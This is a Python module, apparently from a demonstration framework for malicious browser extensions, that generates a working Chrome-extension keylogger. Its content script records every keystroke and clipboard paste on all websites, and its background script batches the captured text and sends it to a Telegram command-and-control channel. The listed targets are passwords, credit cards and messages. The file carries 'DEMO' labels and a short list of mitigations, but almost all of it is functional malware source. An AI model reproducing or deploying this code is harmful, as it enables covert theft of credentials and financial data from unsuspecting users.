from .base import BasePayload, Payload


class Keylogger(BasePayload):

    def get_payload(self) -> Payload:
        return Payload(
            id="keylogger",
            name="Keylogger",
            description="Перехватывает нажатия клавиш. Отправляет в Telegram.",
            icon="⌨️",
            risk_level="high",
            permissions=["<all_urls>", "storage"],
            targets=["passwords", "credit cards", "messages", "search queries"],
            demo_instructions=(
                "1. Установите расширение\n"
                "2. Печатайте на любом сайте\n"
                "3. Данные придут в Telegram"
            ),
            mitigation=[
                "Используйте менеджер паролей",
                "Виртуальная клавиатура для критичных данных",
                "Проверяйте расширения",
                "Аппаратные ключи (FIDO2)",
            ],
        )

    def get_background_js(self) -> str:
        return r"""
// ============================================================
// Keylogger — C2
// ============================================================

console.log('[DEMO] Keylogger: background loaded');

let keyBuffer = '';
let totalKeys = 0;
let lastFlush = Date.now();
const FLUSH_INTERVAL = 30000;  // 30 сек
const MAX_BUFFER = 500;

function flushBuffer() {
    if (!keyBuffer) return;
    if (typeof C2_CONFIG === 'undefined' || !C2_CONFIG.enabled) {
        console.log('[DEMO] Would flush keys:', keyBuffer.length);
        keyBuffer = '';
        return;
    }

    const text = `⌨️ <b>Keylogger</b>\n` +
        `Сессия: <code>${C2_CONFIG.sessionId}</code>\n` +
        `Всего нажатий: <b>${totalKeys}</b>\n` +
        `Время: ${new Date().toLocaleString('ru')}\n\n` +
        `<b>Текст:</b>\n<pre>${c2Escape(keyBuffer.substring(0, 3000))}</pre>`;

    c2Send(text);
    keyBuffer = '';
    lastFlush = Date.now();
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'keystroke') {
        totalKeys++;
        keyBuffer += msg.key || '';

        if (keyBuffer.length > MAX_BUFFER) {
            flushBuffer();
        }

        chrome.action.setBadgeText({ text: String(totalKeys) });
        chrome.action.setBadgeBackgroundColor({ color: '#FF9800' });

        chrome.storage.local.set({ demo_keystroke_count: totalKeys });
        sendResponse({ status: 'ok' });
    }

    if (msg.action === 'flush_keys') {
        flushBuffer();
        sendResponse({ status: 'ok', buffer: keyBuffer });
    }

    if (msg.action === 'get_keylog_stats') {
        chrome.storage.local.get(['demo_keystroke_count'], (data) => {
            sendResponse(data);
        });
        return true;
    }
});

// Автофлаш каждые 30 сек
setInterval(flushBuffer, FLUSH_INTERVAL);
"""

    def get_content_js(self) -> str:
        return r"""
// ============================================================
// Keylogger — Content Script
// ============================================================

console.log('[DEMO] Keylogger: content script loaded');

// Собираем нажатия
document.addEventListener('keydown', (e) => {
    // Пропускаем модификаторы отдельно
    let key = e.key;
    if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
        return;
    }

    // Специальные символы
    if (key === 'Enter') key = '\n';
    else if (key === 'Tab') key = '\t';
    else if (key === 'Backspace') key = '[BACKSPACE]';
    else if (key === 'Escape') key = '[ESC]';
    else if (key.length > 1) key = `[${key}]`;

    chrome.runtime.sendMessage({
        action: 'keystroke',
        key: key,
        url: location.hostname,
    });
}, true);

// Собираем вставки из буфера
document.addEventListener('paste', (e) => {
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    if (pasted) {
        chrome.runtime.sendMessage({
            action: 'keystroke',
            key: `[PASTE: ${pasted.substring(0, 200)}]`,
            url: location.hostname,
        });
    }
}, true);

// Автофлаш при уходе со страницы
window.addEventListener('beforeunload', () => {
    chrome.runtime.sendMessage({ action: 'flush_keys' });
});
"""

    def get_popup_js(self) -> str:
        return """
chrome.runtime.sendMessage({ action: 'get_keylog_stats' }, (data) => {
    if (data && data.demo_keystroke_count) {
        const el = document.getElementById('demo-count');
        if (el) el.textContent = data.demo_keystroke_count;
    }
});
"""


__all__ = ["Keylogger"]
